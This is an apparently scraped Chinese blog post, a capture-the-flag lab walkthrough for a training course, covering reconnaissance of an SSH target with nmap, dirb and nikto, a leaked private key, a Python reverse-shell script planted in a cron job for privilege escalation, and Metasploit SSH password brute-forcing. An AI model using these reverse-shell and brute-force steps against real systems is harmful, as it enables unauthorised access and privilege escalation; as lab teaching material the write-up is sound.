@@ -1,0 +1,1267 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+  <meta name="keywords" content="网络安全,nmap,dirb,metasploit,nikto,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="51CTO的网课，本篇通过探测服务器敏感文件获取普通用户SSH秘钥，连接服务器后探测定时任务，替换执行文件为反弹shell脚本提权，最后使用了暴力破解密码进行提权，最终夺取flag。 本篇使用工具nmap、dirb、nikto、metasploit。">
+<meta name="keywords" content="网络安全,nmap,dirb,metasploit,nikto">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全0x02】SSH服务器夺旗">
+<meta property="og:url" content="http://got17.cn/1052/index.html">
+<meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="51CTO的网课，本篇通过探测服务器敏感文件获取普通用户SSH秘钥，连接服务器后探测定时任务，替换执行文件为反弹shell脚本提权，最后使用了暴力破解密码进行提权，最终夺取flag。 本篇使用工具nmap、dirb、nikto、metasploit。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://got17.cn/1052/1.PNG">
+<meta property="og:image" content="http://got17.cn/1052/2.PNG">
+<meta property="og:image" content="http://got17.cn/1052/3.PNG">
+<meta property="og:image" content="http://got17.cn/1052/4.PNG">
+<meta property="og:image" content="http://got17.cn/1052/5.PNG">
+<meta property="og:image" content="http://got17.cn/1052/6.PNG">
+<meta property="og:image" content="http://got17.cn/1052/7.PNG">
+<meta property="og:image" content="http://got17.cn/1052/8.PNG">
+<meta property="og:image" content="http://got17.cn/1052/9.PNG">
+<meta property="og:image" content="http://got17.cn/1052/10.PNG">
+<meta property="og:image" content="http://got17.cn/1052/11.PNG">
+<meta property="og:image" content="http://got17.cn/1052/12.PNG">
+<meta property="og:image" content="http://got17.cn/1052/13.PNG">
+<meta property="og:image" content="http://got17.cn/1052/14.PNG">
+<meta property="og:image" content="http://got17.cn/1052/15.PNG">
+<meta property="og:image" content="http://got17.cn/1052/16.PNG">
+<meta property="og:image" content="http://got17.cn/1052/17.PNG">
+<meta property="og:image" content="http://got17.cn/1052/18.PNG">
+<meta property="og:image" content="http://got17.cn/1052/19.PNG">
+<meta property="og:image" content="http://got17.cn/1052/20.PNG">
+<meta property="og:updated_time" content="2020-08-15T10:39:12.340Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【网络安全0x02】SSH服务器夺旗">
+<meta name="twitter:description" content="51CTO的网课，本篇通过探测服务器敏感文件获取普通用户SSH秘钥，连接服务器后探测定时任务，替换执行文件为反弹shell脚本提权，最后使用了暴力破解密码进行提权，最终夺取flag。 本篇使用工具nmap、dirb、nikto、metasploit。">
+<meta name="twitter:image" content="http://got17.cn/1052/1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://got17.cn/1052/">
+
+
+
+
+
+  <title>【网络安全0x02】SSH服务器夺旗 | gaoteng's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">gaoteng's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1052/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gaoteng17">
+      <meta itemprop="description" content="About Life, Work and Code.">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">【网络安全0x02】SSH服务器夺旗</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-13T18:53:08+08:00">
+                2020-05-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>51CTO的网课，本篇通过探测服务器敏感文件获取普通用户SSH秘钥，连接服务器后探测定时任务，替换执行文件为反弹shell脚本提权，最后使用了暴力破解密码进行提权，最终夺取flag。</p>
+<p>本篇使用工具nmap、dirb、nikto、metasploit。</p>
+<a id="more"></a>
+
+<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul>
+<li><p>探测靶场开放的服务与服务的版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- nmap -sV 靶场IP地址</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>探测靶场全部信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- nmap -A -v 靶场IP地址</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>探测靶场的操作系统类型与版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- nmap -O 靶场IP地址</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><ul>
+<li>挖掘靶场网站敏感信息</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 靶场IP地址</span><br></pre></td></tr></table></figure>
+
+<h2 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h2><ul>
+<li>挖掘靶场网站敏感信息</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 靶场IP地址</span><br></pre></td></tr></table></figure>
+
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><ul>
+<li>基础命令</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">whoami 查看当前用户</span><br><span class="line">id 查看当前用户权限</span><br><span class="line"></span><br><span class="line">cat /etc/passwd 查看所有用户的列表</span><br><span class="line">cat /etc/group 查看用户组</span><br><span class="line">find / -user 用户名  查看属于某些用户的文件</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>敏感文件目录</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp 缓冲文件目录</span><br><span class="line"></span><br><span class="line">cat /etc/crontab 挖掘其他用户的定时任务</span><br></pre></td></tr></table></figure>
+
+<h2 id="反弹shell-py"><a href="#反弹shell-py" class="headerlink" title="反弹shell(py)"></a>反弹shell(py)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"攻击机IP地址"</span>,<span class="string">"攻击机监听端口"</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+
+<h2 id="暴力破解ssh登录口令"><a href="#暴力破解ssh登录口令" class="headerlink" title="暴力破解ssh登录口令"></a>暴力破解ssh登录口令</h2><ul>
+<li>cupp生成字典</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jeanphorn/common-password.git</span><br><span class="line">chmod +x cupp.py</span><br><span class="line"><span class="comment">#以交互方式创建字典</span></span><br><span class="line">./cupp.py -i</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>metasploit破解ssh密码</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">&gt; <span class="built_in">set</span> rhosts 192.168.1.113</span><br><span class="line">&gt; <span class="built_in">set</span> username hadi</span><br><span class="line">&gt; <span class="built_in">set</span> pass_file /root/Desktop/common-password/hadi.txt</span><br><span class="line">&gt; <span class="built_in">set</span> threads 5</span><br><span class="line">&gt; <span class="built_in">set</span> verbose <span class="literal">true</span></span><br><span class="line">&gt; run</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>优化会话显示带用户、目录的命令行界面</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">su - root</span><br></pre></td></tr></table></figure>
+
+<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
+<li>nmap扫描靶机IP地址开放端口、系统信息等：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.113</span><br><span class="line">nmap -O 192.168.1.113</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/1.PNG" alt></p>
+<p><img src="/1052/2.PNG" alt></p>
+<ol start="2">
+<li>访问http服务，搜集敏感信息，<strong>contact等信息很有可能是ssh登录用户</strong>：</li>
+</ol>
+<p><img src="/1052/3.PNG" alt></p>
+<ol start="3">
+<li>dirb扫网站目录，搜集敏感文件目录，nikto命令也可以：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.113</span><br><span class="line">nikto -host 192.168.1.113</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/4.PNG" alt></p>
+<p><img src="/1052/5.PNG" alt></p>
+<ol start="4">
+<li>查看<code>/files</code>、<code>/icons</code>等目录，找到<code>VDSoyuAXiO.txt</code>这个奇怪的文件，打开发现是秘钥：</li>
+</ol>
+<p><img src="/1052/6.PNG" alt></p>
+<p><img src="/1052/7.PNG" alt></p>
+<ol start="5">
+<li>wget下来，改名为id_rsa，并且修改权限为600，大胆猜测这个是首页contact信息<code>martin</code>用户的秘钥：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">"http://192.168.1.113/icons/VDSoyuAXiO.txt"</span></span><br><span class="line">mv VDSoyuAXiO.txt id_rsa</span><br><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/8.PNG" alt></p>
+<ol start="6">
+<li>先连接靶机，看看能不能登录，不能的话再本地破解密码，这里是直接登陆成功了，另外注意一点，如果做完之前的实验，新实验靶机IP没有变的话，要先清掉已知主机：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/known_hosts</span><br><span class="line">ssh -i id_rsa martin@192.168.1.113</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/9.PNG" alt></p>
+<ol start="7">
+<li>martin用户没有root权限，探测敏感目录<code>/tmp</code>、<code>/etc/crontab</code>发现jimmy用户的5分钟自动定时任务，但是执行文件不存在：</li>
+</ol>
+<p><img src="/1052/10.PNG" alt></p>
+<ol start="8">
+<li>编写python反弹shell脚本作为执行文件，增加执行权限，同时查找攻击机未在使用的端口作为监听端口：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">touch sekurity.py</span><br><span class="line">vi sekurity.py</span><br><span class="line">chmod +x sekurity.py</span><br><span class="line"></span><br><span class="line">netstat -pantu</span><br><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"攻击机IP地址"</span>,<span class="string">"攻击机监听端口"</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/11.PNG" alt></p>
+<ol start="9">
+<li>等五分钟左右，进入shell，查看用户是jimmy，结果也没有权限，获取不到flag：</li>
+</ol>
+<p><img src="/1052/12.PNG" alt></p>
+<ol start="10">
+<li>最后一个hadi用户只能尝试暴力破解，这里使用jeanphorn的common-password，从github上clone下来，交互界面进入：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jeanphorn/common-password.git</span><br><span class="line"><span class="built_in">cd</span> /common-password</span><br><span class="line">chmod +x cupp.py</span><br><span class="line"><span class="comment">#以交互方式创建字典</span></span><br><span class="line">./cupp.py -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/13.PNG" alt></p>
+<ol start="11">
+<li>编辑密码字典，name填hadi，添加随机数字，其他都不加：</li>
+</ol>
+<p><img src="/1052/14.PNG" alt></p>
+<ol start="12">
+<li>字典生成好了，进msfconsole破解，查看ssh_login模块的参数：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">&gt; show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/15.PNG" alt></p>
+<ol start="13">
+<li>编辑靶机IP、SSH用户名、密码字典、线程等参数：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">set</span> rhosts 192.168.1.113</span><br><span class="line">&gt; <span class="built_in">set</span> username hadi</span><br><span class="line">&gt; <span class="built_in">set</span> pass_file /root/Desktop/common-password/hadi.txt</span><br><span class="line">&gt; <span class="built_in">set</span> threads 5</span><br><span class="line">&gt; <span class="built_in">set</span> verbose <span class="literal">true</span></span><br><span class="line">&gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/16.PNG" alt></p>
+<ol start="14">
+<li>确认参数无误，开始run，等结果：</li>
+</ol>
+<p><img src="/1052/17.PNG" alt></p>
+<ol start="15">
+<li>这个字典竟然没密码，还是生成的简单了，实际上密码是hadi123，直接添加msf里，破解成功是这样显示的：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">set</span> password hadi123</span><br><span class="line">&gt; run</span><br><span class="line"></span><br><span class="line">&gt;sessions -i 1  <span class="comment">#进入编号1的交互session</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/18.PNG" alt></p>
+<ol start="16">
+<li>session里交互不是很方便，可以执行下面的python脚本把bash定向到回话中，优化交互界面：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/19.PNG" alt></p>
+<ol start="17">
+<li>su提权，获取flag：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - root</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/1052/20.PNG" alt></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW" target="_blank" rel="noopener">2020发布 CTF基础入门/CTF教程零基础 渗透测试/web安全/CTF夺旗【整套教程】</a></li>
+<li><a href="https://blog.csdn.net/m0_46622606/article/details/105059054" target="_blank" rel="noopener">2-3CTF夺旗入门教程–SSH服务测试（root权限）</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/网络安全/" rel="tag"><i class="fa fa-tag"></i> 网络安全</a>
+          
+            <a href="/tags/nmap/" rel="tag"><i class="fa fa-tag"></i> nmap</a>
+          
+            <a href="/tags/dirb/" rel="tag"><i class="fa fa-tag"></i> dirb</a>
+          
+            <a href="/tags/metasploit/" rel="tag"><i class="fa fa-tag"></i> metasploit</a>
+          
+            <a href="/tags/nikto/" rel="tag"><i class="fa fa-tag"></i> nikto</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/1051/" rel="next" title="【网络安全0x01】SSH私钥泄露">
+                <i class="fa fa-chevron-left"></i> 【网络安全0x01】SSH私钥泄露
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/1053/" rel="prev" title="【网络安全0x03】SMB信息泄露">
+                【网络安全0x03】SMB信息泄露 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+    
+    <div id="gitalk-container">
+    </div>
+  
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="gaoteng17">
+            
+              <p class="site-author-name" itemprop="name">gaoteng17</p>
+              <p class="site-description motion-element" itemprop="description">About Life, Work and Code.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">91</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/gaoteng17" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:gaoteng17@gmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/u/5544866728" target="_blank" title="Weibo">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#使用命令"><span class="nav-number">1.</span> <span class="nav-text">使用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">1.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dirb"><span class="nav-number">1.2.</span> <span class="nav-text">dirb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nikto"><span class="nav-number">1.3.</span> <span class="nav-text">nikto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux"><span class="nav-number">1.4.</span> <span class="nav-text">linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell-py"><span class="nav-number">1.5.</span> <span class="nav-text">反弹shell(py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#暴力破解ssh登录口令"><span class="nav-number">1.6.</span> <span class="nav-text">暴力破解ssh登录口令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透记录"><span class="nav-number">2.</span> <span class="nav-text">渗透记录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gaoteng17</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+  <div class="footer-custom">Welcome to my <a target="_blank" href="https://github.com/gaoteng17">GitHub Page</a></div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
